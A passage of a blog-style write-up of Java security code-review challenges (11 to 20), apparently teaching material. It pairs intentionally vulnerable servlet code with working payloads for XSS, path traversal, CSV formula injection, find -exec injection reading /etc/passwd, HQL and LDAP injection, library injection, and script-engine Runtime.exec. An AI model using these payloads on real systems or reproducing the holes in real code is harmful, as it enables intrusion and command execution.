  <li>The attacker injects a script tag with the ‚Äú<a href="http://www.w3.org/1999/xhtml">http://www.w3.org/1999/xhtml</a>‚Äù namespace.</li>
  <li>Escaping the CDATA element is bypassed with a space between ‚Äú]]‚Äù.</li>
  <li>Tabs are used for other spaces needed in the payload.</li>
  <li>The provided payload demonstrates exploiting this vulnerability.</li>
</ul>

<p>The following payload can be used to exploit this challenge:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>test] ]&gt;&lt;something%3Ascript%09xmlns%3Asomething%3D"http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml"&gt;alert(1)&lt;%2Fsomething%3Ascript&gt;&lt;![CDATA[
</pre></td></tr></tbody></table></code></div></div>

<h3 id="challenge-11---carolers"><span class="mr-2">Challenge 11 - Carolers</span><a href="#challenge-11---carolers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>import javax.servlet.http.*;
import java.io.*;
import java.nio.file.Files;
import org.apache.commons.compress.archivers.ArchiveStreamFactory;
import org.apache.commons.compress.archivers.tar.*;
import org.apache.commons.io.IOUtils;

public class ExtractFiles extends HttpServlet {
  private static void extract() throws Exception {
    // /tmp/uploaded.tar is user controlled and an uploaded file.
    final InputStream is = new FileInputStream(new File("/tmp/uploaded.tar"));
    final TarArchiveInputStream tarInputStream = (TarArchiveInputStream) (new ArchiveStreamFactory().createArchiveInputStream(ArchiveStreamFactory.TAR, is));
    File tmpDir = Files.createTempDirectory("test").toFile();
    TarArchiveEntry entry;
    while ((entry = tarInputStream.getNextTarEntry()) != null) {
      File file = new File(tmpDir, entry.getName().replace("../", ""));
      if (entry.isDirectory()) {
        file.mkdirs();
      } else {
        IOUtils.copy(tarInputStream, new FileOutputStream(file));
      }
    }
    is.close();
    tarInputStream.close();
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The code extracts a TAR file into a temporary directory.</li>
  <li>The user controls the contents of /tmp/uploaded.tar.</li>
  <li>A TAR file is an archive of files and folders, each represented by a TarArchiveEntry object.</li>
  <li>The attacker can control the filename of a TarArchiveEntry using TarArchiveEntry.getName().</li>
  <li>The user input reaches the sensitive sink java.io.File in line 16.</li>
  <li>This can lead to a path traversal (zip slip) attack.</li>
  <li>The sanitization in line 16 is insufficient, as it only removes ../.</li>
  <li>The following payload can bypass the sanitization on a Linux system with a Tomcat server: <code class="language-plaintext highlighter-rouge">..././..././..././..././..././var/tomcat/webapps/ROOT/index.jsp</code></li>
</ul>

<h3 id="challenge-12---evergreen"><span class="mr-2">Challenge 12 - Evergreen</span><a href="#challenge-12---evergreen" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>index.jsp

&lt;%@ page import="org.owasp.esapi.ESAPI" %&gt;
&lt;%! String customClass = "default"; %&gt;
&lt;html&gt;&lt;body&gt;&lt;%@ include file="init.jsp" %&gt;

&lt;div class="&lt;%= customClass %&gt;"&gt;
  &lt;%! String username; %&gt;
  &lt;% username = request.getParameter("username"); %&gt;
  Welcome citizen, you have been identified as
  &lt;%
    customClass = request.getParameter("customClass");
    customClass = ESAPI.encoder().encodeForHTML(customClass);
  %&gt;
  &lt;div class="&lt;%= customClass %&gt;"&gt;
  &lt;%= ESAPI.encoder().encodeForHTML(username) %&gt;.
&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

init.jsp
&lt;% customClass = request.getParameter("customClass"); %&gt;

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>A class is dynamically assigned to a div element in line 5.</li>
  <li>The class is derived from the <code class="language-plaintext highlighter-rouge">customClass</code> variable.</li>
  <li><code class="language-plaintext highlighter-rouge">customClass</code> is initially set to ‚Äúdefault‚Äù but is overwritten by the contents of <code class="language-plaintext highlighter-rouge">init.jsp</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">init.jsp</code> fetches user input and assigns it directly to <code class="language-plaintext highlighter-rouge">customClass</code> without sanitization.</li>
  <li>This allows an attacker to control the class attribute of the div element.</li>
  <li>A simple double quote can be used to break out of the attribute.</li>
  <li>Other user input instances are properly sanitized with an ESAPI encoder.</li>
</ul>

<h3 id="challenge-13---epiphany"><span class="mr-2">Challenge 13 - Epiphany</span><a href="#challenge-13---epiphany" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre>import javax.servlet.http.*;
import java.io.*;
import java.util.List;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

public class UploadFileController extends HttpServlet {
  protected void doPost(HttpServletRequest request,
                        HttpServletResponse response) throws IOException {
    DiskFileItemFactory factory = new DiskFileItemFactory();
    factory.setRepository(new File(System.getProperty("java.io.tmpdir")));
    ServletFileUpload upload = new ServletFileUpload(factory);

    String uploadPath = getServletContext().getRealPath("") + "upload";
    File uploadDir = new File(uploadPath);
    if (!uploadDir.exists()) {
      uploadDir.mkdir();
    }
    try {
      List&lt;FileItem&gt; items = upload.parseRequest(request);
      if (items != null &amp;&amp; items.size() &gt; 0) {
        for (FileItem item : items) {
          if (!item.isFormField()) {
            if (!(item.getContentType().equals("text/plain"))) {
              throw new Exception("ContentType mismatch");
            }
            String file = uploadPath + File.separator + item.getName();
            File storeFile = new File(file);
            item.write(storeFile);
          }
        }
      }
    } catch (Exception ex) {
      response.sendRedirect("/");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The challenge involves a multi-part file upload.</li>
  <li>The uploaded file must have a content type of <code class="language-plaintext highlighter-rouge">text/plain</code>.</li>
  <li>A content type check is in place to prevent dangerous file uploads (line 26).</li>
  <li>However, the attacker controls the content type and can easily bypass the check.</li>
  <li>The filename of the uploaded file is also user-controlled (line 28).</li>
  <li>This leads to a Path Traversal vulnerability due to the acceptance of <code class="language-plaintext highlighter-rouge">/../</code> in filenames.</li>
  <li>By combining the content type bypass and Path Traversal, an attacker can upload arbitrary files and execute remote commands.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>Content-Disposition: form-data; name="uploadFile"; filename="../../../hacked.jsp"
Content-Type: text/plain
</pre></td></tr></tbody></table></code></div></div>

<h3 id="challenge-14---chimney"><span class="mr-2">Challenge 14 - Chimney</span><a href="#challenge-14---chimney" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre>import java.io.PrintWriter;
import java.util.*;
import javax.servlet.http.*;

public class Export extends HttpServlet {
  protected void doPost(HttpServletRequest request,
                        HttpServletResponse response) throws IOException {
    response.setContentType("text/csv");
    response.setCharacterEncoding("UTF-8");
    PrintWriter out = response.getWriter();

    String content = buildCSV(request);
    out.print(content);
    out.flush();
  }

  public String buildCSV(HttpServletRequest request) {
    {
      StringBuilder str = new StringBuilder();

      List&lt;List&lt;String&gt;&gt; rows = Arrays.asList(
        Arrays.asList("Scott", "editor", request.getParameter("description"))
      );

      str.append("Name");
      str.append(",");
      str.append("Role");
      str.append(",");
      str.append("Description");
      str.append("\n");

      for (List&lt;String&gt; rowData : rows) {
        str.append(String.join(",", rowData));
        str.append("\n");
      }

      return str.toString();
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The servlet exports a CSV file containing unfiltered user input.</li>
  <li>This leads to a Formula Injection vulnerability.</li>
  <li>The <code class="language-plaintext highlighter-rouge">description</code> parameter (line 22) is directly added to the <code class="language-plaintext highlighter-rouge">StringBuilder</code> in line 33 without sanitization.</li>
  <li>An attacker can inject a payload like <code class="language-plaintext highlighter-rouge">=cmd|'C calc.exe'!Z0</code> via the <code class="language-plaintext highlighter-rouge">description</code> parameter.</li>
  <li>This results in a CSV file with malicious formulas that can execute commands.</li>
</ul>

<h3 id="challenge-15---mistletoe"><span class="mr-2">Challenge 15 - Mistletoe</span><a href="#challenge-15---mistletoe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>import org.apache.commons.io.IOUtils;
import javax.servlet.http.*;
import java.io.*;
import java.util.*;

public class FindOnSystem extends HttpServlet {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    try {
      String[] binary = {"find", ".", "-type", "d"};
      ArrayList&lt;String&gt; cmd = new ArrayList&lt;&gt;(Arrays.asList(binary));

      String[] options = request.getParameter("options").split(" ");
      for (String i : options) {
        cmd.add(i);
      }

      ProcessBuilder processBuilder = new ProcessBuilder(cmd);
      Process process = processBuilder.start();
      IOUtils.copy(process.getInputStream(),response.getOutputStream());
    } catch(Exception e) {
      response.sendRedirect("/");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The servlet uses the <code class="language-plaintext highlighter-rouge">find</code> system command to list directories.</li>
  <li>This exposes directory information, leading to an information leak.</li>
  <li>The base command is <code class="language-plaintext highlighter-rouge">find . -type d</code> (lines 9-10).</li>
  <li>User-controlled <code class="language-plaintext highlighter-rouge">options</code> are appended to the command (lines 12-15).</li>
  <li>The command is executed using <code class="language-plaintext highlighter-rouge">java.lang.ProcessBuilder</code> (lines 17-18).</li>
  <li>While direct command injection is not possible, an Argument Injection vulnerability exists.</li>
  <li>The <code class="language-plaintext highlighter-rouge">-exec</code> parameter can be injected to execute arbitrary commands.</li>
  <li>A payload like <code class="language-plaintext highlighter-rouge">?options=-exec cat /etc/passwd ;</code> leads to the execution of <code class="language-plaintext highlighter-rouge">find . -type d -exec cat /etc/passwd ;</code>.</li>
</ul>

<h3 id="challenge-16---candles"><span class="mr-2">Challenge 16 - Candles</span><a href="#challenge-16---candles" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>import java.io.Serializable;
import javax.persistence.*;

@Entity
@DynamicUpdate
@Table(name = "UserEntity", uniqueConstraints = {
        @UniqueConstraint(columnNames = "ID"),
        @UniqueConstraint(columnNames = "EMAIL") })
public class UserEntity implements Serializable {
  public UserEntity(String email, String firstName, String lastName) {
    this.email = email;
    this.firstName = firstName;
    this.lastName = lastName;
  }

  private static final long serialVersionUID = -1798070786993154676L;

  @Id
  @GeneratedValue(strategy = GenerationType.IDENTITY)
  @Column(name = "ID", unique = true, nullable = false)
  private Integer userId;

  @Column(name = "EMAIL", unique = true, nullable = false, length = 100)
  private String email;

  @Column(name = "FIRST_NAME", unique = false, nullable = false, length = 100)
  private String firstName;

  @Column(name = "LAST_NAME", unique = false, nullable = false, length = 100)
  private String lastName;
}
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>import org.hibernate.*;
import org.springframework.web.bind.annotation.RequestParam;

public class FindController {
  public String escapeQuotes(String in){
    return in.replaceAll("'","''");
  }

  @RequestMapping("/findUsers")
  public void findUsers(@RequestParam(name="name") String name, HttpServletResponse res) throws IOException{
    Configuration config = new Configuration();
    // Create SessionFactory with MySQL driver
    SessionFactory sessionFactory = config.configure().buildSessionFactory();
    Session session = sessionFactory.openSession();
    List &lt;UserEntity&gt; users = session.createQuery("from UserEntity where FIRST_NAME ='" + escapeQuotes(name) + "'", UserEntity.class).list();
    res.getWriter().println("Found " + users.size() + " Users with that name");
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>User input is received via the <code class="language-plaintext highlighter-rouge">@RequestParam</code> annotation and mapped to the <code class="language-plaintext highlighter-rouge">name</code> parameter of the <code class="language-plaintext highlighter-rouge">findUsers</code> method.</li>
  <li>A Hibernate Session is created using the MySQL driver.</li>
  <li>A HQL query is executed to retrieve <code class="language-plaintext highlighter-rouge">UserEntity</code> objects based on a user-supplied filter.</li>
  <li>The <code class="language-plaintext highlighter-rouge">escapeQuotes</code> method is used to escape single quotes within the string literal.</li>
  <li>However, the escaping is insufficient to prevent HQL injection.</li>
  <li>An attacker can inject a payload like <code class="language-plaintext highlighter-rouge">test\' or 1=sleep(1) -- -</code> to bypass the escaping.</li>
  <li>This payload allows the execution of arbitrary MySQL queries.</li>
  <li>The injected query will be sent to the database: <code class="language-plaintext highlighter-rouge">... where FIRST_NAME='test\'' or 1=sleep(5)-- -'</code>.</li>
</ul>

<h3 id="challenge-17---carol-singers"><span class="mr-2">Challenge 17 - Carol Singers</span><a href="#challenge-17---carol-singers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre>import java.io.IOException;
import java.lang.reflect.Field;
import java.util.*;
import java.util.regex.Pattern;
import javax.servlet.http.*;

public class JavaDeobfuscatorStartupController extends HttpServlet {
  private static boolean isInBlacklist(String input) {
    String[] blacklist = {"java","os","file"};
    return Arrays.asList(blacklist).contains(input);
  }

  private static void setEnv(String key, String value) {
    String[] values = key.split(Pattern.quote("."));
    if (isInBlacklist(values[0])) {
      return;
    }

    List&lt;String&gt; list = new ArrayList&lt;&gt;(Arrays.asList(values));
    list.removeAll(Arrays.asList("", null));
    String property = String.join(".", list);
    System.setProperty(property, value);
  }

  private static void loadEnv(HttpServletRequest request) {
    Cookie[] cookies = request.getCookies();
    for (int i = 0; i &lt; cookies.length; i++)
      if (cookies[i].getName().equals("env")) {
        String[] tmp = cookies[i].getValue().split("@", 2);
        setEnv(tmp[0], tmp[1]);
      }
    }

  private static void uploadFile() {
    // Secure file upload with arbitrary content type and extension in known path /var/myapp/data
  }

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    loadEnv(request);
    try {
      final Field sysPathsField = ClassLoader.class.getDeclaredField("sys_paths");
      sysPathsField.setAccessible(true);
      sysPathsField.set(null, null);
      System.loadLibrary("DEOBFUSCATION_LIB");
    } catch (Exception e) {
      response.sendRedirect("/");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">loadEnv</code> method (line 39) processes the user-controlled cookie <code class="language-plaintext highlighter-rouge">env</code> (lines 26-29).</li>
  <li>Inside <code class="language-plaintext highlighter-rouge">loadEnv</code>, <code class="language-plaintext highlighter-rouge">setEnv</code> is called with user-controlled key/value pairs (line 30).</li>
  <li>The key is split by ‚Äú.‚Äù and a blacklist check is done on the first element (line 15) to prevent setting system properties like <code class="language-plaintext highlighter-rouge">java</code>.</li>
  <li>The blacklist check can be bypassed with a payload like <code class="language-plaintext highlighter-rouge">.java.xxx</code>.</li>
  <li>Only the first element is checked, and empty strings are allowed (line 9/10).</li>
  <li>After the check, empty values are removed and the remaining parts are joined with ‚Äú.‚Äù again (line 20).</li>
  <li>The attacker‚Äôs goal is to set <code class="language-plaintext highlighter-rouge">java.library.path</code> (line 22) to <code class="language-plaintext highlighter-rouge">/var/myapp/data</code> for Library Injection.</li>
  <li>This path allows uploading a malicious library named <code class="language-plaintext highlighter-rouge">libDEOBFUSCATION_LIB.so</code> (line 34).</li>
  <li>The library filename needs the prefix ‚Äúlib‚Äù and suffix ‚Äú.so‚Äù for <code class="language-plaintext highlighter-rouge">System.loadLibrary</code> to load it (line 44).</li>
  <li>POC: 1. <code class="language-plaintext highlighter-rouge">Upload file: </code>curl -v -F ‚Äòupload=@/tmp/libDEOBFUSCATION_LIB.so‚Äô http://victim.org/`</li>
  <li>POC 2. Load malicious library: <code class="language-plaintext highlighter-rouge">curl -v --cookie 'env=.java.library.path@/var/myapp/data'</code></li>
</ul>

<h3 id="challenge-18---reindeer"><span class="mr-2">Challenge 18 - Reindeer</span><a href="#challenge-18---reindeer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td><td class="rouge-code"><pre>import org.apache.tomcat.util.http.fileupload.IOUtils;
import javax.servlet.http.*;
import java.util.HashMap;

public class LoadConfig extends HttpServlet {
  public static HashMap&lt;String, String&gt; parseRequest(String value) {
    HashMap&lt;String, String&gt; result = new HashMap&lt;String, String&gt;();
    if (value != null) {
      String tmp[] = value.split("@");
      for (int i = 0; i &lt; tmp.length; i = i + 2) {
        result.put(tmp[i], tmp[i + 1]);
      }
    }
    return result;
  }

  protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    if (request.getParameter("home") != null) {
      HttpSession session = request.getSession(true);
      if (!session.isNew()){
        if (validBasicAuthHeader()) { // Checks the Basic Authorization header (password check)
          // Execute last command:
          ProcessBuilder processBuilder = new ProcessBuilder();
          processBuilder.command((String)session.getAttribute("last_command"));
          try {
            Process process = processBuilder.start();
            IOUtils.copy(process.getInputStream(), response.getOutputStream());
          }
          catch (Exception e){
            return;
          }
        }
      }
    } else if (request.getParameter("save_session") != null) {
      String value = request.getParameter("config");
      HashMap&lt;String, String&gt; config = parseRequest(value);
      for (String i : config.keySet()) {
        Cookie settings = new Cookie(i, config.get(i));
        response.addCookie(settings);
      }
    } else {
      HttpSession session = request.getSession(true);
      if (session.isNew()) {
        HashMap&lt;String, String&gt; whitelist = new HashMap&lt;String, String&gt;();
        whitelist.put("home", "yes");
        whitelist.put("role", "frontend");

        String value = request.getParameter("config");
        HashMap&lt;String, String&gt; config = parseRequest(value);

        whitelist.putAll(config);
        for (String i : whitelist.keySet()) {
          session.setAttribute(i, whitelist.get(i));
        }
      }
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The code is vulnerable to both Session Fixation and Command Injection.</li>
  <li>Upon visiting the application, a new session is created with user-controlled session variables (lines 43-54).</li>
  <li>Attackers can manipulate these variables by providing key-value pairs in the <code class="language-plaintext highlighter-rouge">config</code> parameter (line 49).</li>
  <li>This allows them to control their own session variables, including setting <code class="language-plaintext highlighter-rouge">"last_command"</code>.</li>
  <li>However, a password is required via the authorization header for command execution (lines 21, 23-26).</li>
  <li>Leveraging the Session Fixation vulnerability (lines 35-39), an attacker can hijack the admin‚Äôs session.</li>
  <li>This is achieved by sending a link with <code class="language-plaintext highlighter-rouge">config</code> set to a specific session ID (e.g., <code class="language-plaintext highlighter-rouge">curl "http://victim.org/?config=JSESSIONID@D4E9132DB9703009B1C932E7C37286ED"</code>).</li>
  <li>With the admin‚Äôs session hijacked, the attacker can execute their previously stored shell command via <code class="language-plaintext highlighter-rouge">last_command</code> without needing the password.</li>
</ul>

<h3 id="challenge-19---gingerbread"><span class="mr-2">Challenge 19 - Gingerbread</span><a href="#challenge-19---gingerbread" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>import javax.script.ScriptEngineManager;
import javax.servlet.http.*;
import javax.script.ScriptEngine;
import java.io.IOException;
import java.util.regex.*;

public class RenderExpression extends HttpServlet {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    try {
      ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
      ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension("js");

      String dynamiceCodeHere = request.getParameter("p");
      if (!dynamiceCodeHere.startsWith("\"")) {
        throw new Exception();
      }

      Pattern p = Pattern.compile("([^\".()'\\/,a-zA-z\\s\\\\])|(processbuilder|file|url|runtime|getclass|forname|loadclass|new\\s)");
      Matcher m = p.matcher(dynamiceCodeHere.toLowerCase());
      if (m.find()) {
        throw new Exception();
      }

      scriptEngine.eval(dynamiceCodeHere);
      // Proceed
    } catch(Exception e) {
      response.sendRedirect("/");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The parameter <code class="language-plaintext highlighter-rouge">p</code> is received in line 13 and evaluated in line 24, triggering an Expression Language Injection (ELI) vulnerability.</li>
  <li>To prevent ELI, a check for quotes is implemented (lines 14-16) as strings usually start with quotes in this language.</li>
  <li>Additionally, a regular expression blacklist is applied (lines 18-22) to block dangerous classes and constructs used for code execution.</li>
  <li>However, the blacklist can be bypassed due to Java‚Äôs flexibility.</li>
  <li>Reflection can be used to call the <code class="language-plaintext highlighter-rouge">javax.scripts.ScriptEngineManager</code> class, bypassing the blacklist.</li>
  <li>While <code class="language-plaintext highlighter-rouge">eval</code> expects a string, the string can be encoded for code injection.</li>
  <li>A possible payload exploiting reflection and string encoding could look like this:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>victim.org/?p="".equals(javax.script.ScriptEngineManager.class.getConstructor().newInstance().getEngineByExtension("js").eval("java.lang.Runtime.getRuntime().exec(\"touch /tmp/owned.jsp\")".replaceAll("A","R")))
</pre></td></tr></tbody></table></code></div></div>

<h3 id="challenge-20---ornaments"><span class="mr-2">Challenge 20 - Ornaments</span><a href="#challenge-20---ornaments" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre></td><td class="rouge-code"><pre>import javax.naming.*;
import javax.naming.directory.*;
import java.util.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.*;
import java.io.*;

public class UserController extends HttpServlet {
  // This token is SHA-256(createTimestamp of admin user)
  private static final String api_token = "1c4e98fc43d0385e67cd6de8c32f969f371eba8ab84053858b5bfd21a2adb471";

  private static void executeCommand(String user_token, String[] cmd) {
    if (user_token.equals(api_token)) {
      // Execute shell command
    }
  }

  /**
   * Current attributes of objectClass "simpleSecurityObject":
   * createtimestamp, creatorsname, dn, entrycsn, entrydn, entryuuid, objectclass, userpassword, uuid
   */
  private static DirContext initLdap() throws NamingException {
    Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();
    env.put(Context.SECURITY_AUTHENTICATION, "simple");
    env.put(Context.SECURITY_PRINCIPAL, "cn=admin,dc=example,dc=org");
    env.put(Context.SECURITY_CREDENTIALS, "admin");
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
    env.put(Context.PROVIDER_URL, "ldap://127.0.0.1:389/");
    return new InitialDirContext(env);
  }

  private static boolean userExists(DirContext ctx, String username) throws Exception {
    String[] security_blacklist = {"uuid", "userpassword", "surname", "mail", "givenName", "name", "cn", "sn", "objectclass", "|", "&amp;"};
    for (String name : security_blacklist) {
      if (username.contains(name)) {
        throw new Exception();
      }
    }

    String searchFilter = "(&amp;(objectClass=simpleSecurityObject)(uid="+username+"))";
    SearchControls searchControls = new SearchControls();
    searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);
    NamingEnumeration&lt;SearchResult&gt; results = ctx.search("dc=example,dc=org", searchFilter, searchControls);
    if (results.hasMoreElements()) {
      SearchResult searchResult = (SearchResult) results.nextElement();
      return searchResult != null;
    }
    return false;
  }

  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    try {
      DirContext ctx = initLdap();
      if(userExists(ctx, request.getParameter("username"))){
        response.getOutputStream().print("User is found.");
        response.getOutputStream().close();
      }
    } catch (Exception e) {
      response.sendRedirect("/");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">username</code> parameter (line 54) is passed to the <code class="language-plaintext highlighter-rouge">userExists()</code> method.</li>
  <li>The method checks if the user exists in the LDAP directory (lines 32-49).</li>
  <li>The <code class="language-plaintext highlighter-rouge">username</code> is added to a filter string to query the LDAP server (line 40).</li>
  <li>The query checks for an attribute <code class="language-plaintext highlighter-rouge">uid</code> matching the <code class="language-plaintext highlighter-rouge">username</code> (line 40).</li>
  <li>The LDAP query result determines the return value of <code class="language-plaintext highlighter-rouge">userExists()</code> (line 46).</li>
  <li>A blacklist is used to prevent certain attributes from being queried (lines 33-38).</li>
  <li>However, the <code class="language-plaintext highlighter-rouge">createtimestamp</code> attribute is not in the blacklist.</li>
  <li>By injecting payloads like <code class="language-plaintext highlighter-rouge">?username=admin)(createtimestamp=2*</code> or <code class="language-plaintext highlighter-rouge">?username=admin)(createtimestamp=20*</code>, an attacker can leak information about the admin user‚Äôs <code class="language-plaintext highlighter-rouge">createtimestamp</code>.</li>
  <li>This information can be used to generate an API token (line 10) and execute arbitrary commands via the <code class="language-plaintext highlighter-rouge">executeCommand()</code> method (line 14).</li>
</ul>

